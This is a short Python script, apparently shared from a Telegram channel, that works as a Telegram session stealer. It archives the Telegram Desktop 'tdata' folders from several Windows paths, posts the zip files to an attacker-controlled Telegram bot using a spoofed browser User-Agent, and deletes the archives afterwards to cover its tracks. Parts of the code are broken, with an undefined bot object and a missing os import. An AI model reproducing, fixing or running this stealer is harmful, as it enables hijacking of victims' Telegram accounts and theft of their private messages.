################################################################################
#                              RIGHT DECISION                                  #
#                     Telegram https://t.me/Bad_Decision                       #
#      Если сливаете мой скрипт в свой канал. Хотя бы отметьте мой канал       #
################################################################################
import getpass
import requests
import shutil

TOKEN = '' # Токен бота
CHAT_ID = '' # Ваш чат ID

user = getpass.getuser()
try:
    tg_directory1 = "D:\\Telegram Desktop\\tdata\\"
    doc1 = shutil.make_archive('tg1', 'zip', tg_directory1) # Делаем архив
except:
    a = 1
try:
    tg_directory2 = "C:\\Users\\" + user + "\\AppData\\Roaming\\Telegram Desktop\\tdata\\"
    doc2 = shutil.make_archive('tg2', 'zip', tg_directory2) # Делаем архив
except:
    a = 1
try:
    tg_directory3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
    doc3 = shutil.make_archive('tg3', 'zip', tg_directory3) # Делаем архив
except:
    pass


url = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
# Скидываем архив
try:
     with requests.Session() as session:
         session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
         session.post(url,files={"document": open(doc1, 'rb')})
except:
    pass
try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(doc2, 'rb')})
except:
    pass
try:
    doc3 = open(doc3, 'rb')
    bot.send_document(message.chat.id, doc) 
except:
     pass  
try:
    os.remove(doc1) # Удаляем архив
    os.remove(doc2) # Удаляем архив
    os.remove(doc3) # Удаляем архив
except:
    pass